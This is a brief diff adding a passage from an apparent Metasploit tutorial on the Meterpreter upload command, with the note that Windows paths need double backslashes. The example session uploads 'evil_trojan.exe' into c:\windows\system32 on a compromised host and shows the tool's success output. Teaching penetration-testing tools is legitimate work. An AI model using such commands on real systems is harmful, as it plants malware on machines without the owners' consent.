@@ -1,0 +1,8 @@
+As with the download command, you need to use double-slashes with the upload command.
+
+meterpreter > upload evil_trojan.exe c:\\windows\\system32
+
+[*] uploading  : evil_trojan.exe -> c:\windows\system32
+[*] uploaded   : evil_trojan.exe -> c:\windows\system32\evil_trojan.exe
+
+meterpreter >
